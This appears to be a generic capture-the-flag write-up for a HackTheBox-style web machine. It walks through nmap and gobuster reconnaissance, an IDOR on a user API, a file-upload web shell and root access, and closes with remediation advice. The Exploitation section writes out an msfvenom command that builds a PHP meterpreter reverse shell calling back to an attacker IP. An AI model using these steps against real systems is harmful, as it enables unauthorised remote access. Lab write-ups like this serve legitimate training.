Example CTF Challenge

HackTheBox Medium Web Burp Suite Python

Reconnaissance

Start by enumerating the target and gathering information about the services running.

nmap -sC -sV -oA nmap/scan 10.10.10.100

The scan reveals a web server running on port 80 and SSH on port 22. Let's explore the web application first.

gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt

Enumeration

Found several interesting directories including /admin, /uploads, and /api. The admin panel requires authentication, but we can try common credentials or look for vulnerabilities.

  • /admin - Login page with username/password fields
  • /uploads - Directory listing enabled
  • /api/v1/users - JSON endpoint returning user data

Exploitation

The API endpoint has an IDOR vulnerability that allows us to enumerate other users' data. By iterating through user IDs, we can find an admin account.

curl http://10.10.10.100/api/v1/users/1

We discover that user ID 1 is an admin with a weak password. Using the credentials, we access the admin panel and find a file upload functionality that's vulnerable to unrestricted file upload.

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

Post-Exploitation

After uploading the shell, we get a reverse shell and start enumerating the system for privilege escalation vectors.

python3 -c 'import pty; pty.spawn("/bin/bash")'
linpeas.sh

LinPEAS reveals a SUID binary with a known vulnerability. Exploiting it gives us root access.

Remediation

To prevent this vulnerability:

  • Implement proper authentication and authorization checks on API endpoints
  • Validate and restrict file uploads to allowed types only
  • Remove SUID binaries that are not absolutely necessary
  • Keep systems updated with the latest security patches

Lessons Learned

This challenge demonstrated the importance of proper input validation, access controls, and the dangers of misconfigured file upload functionality. Always assume that user input is malicious and validate accordingly.
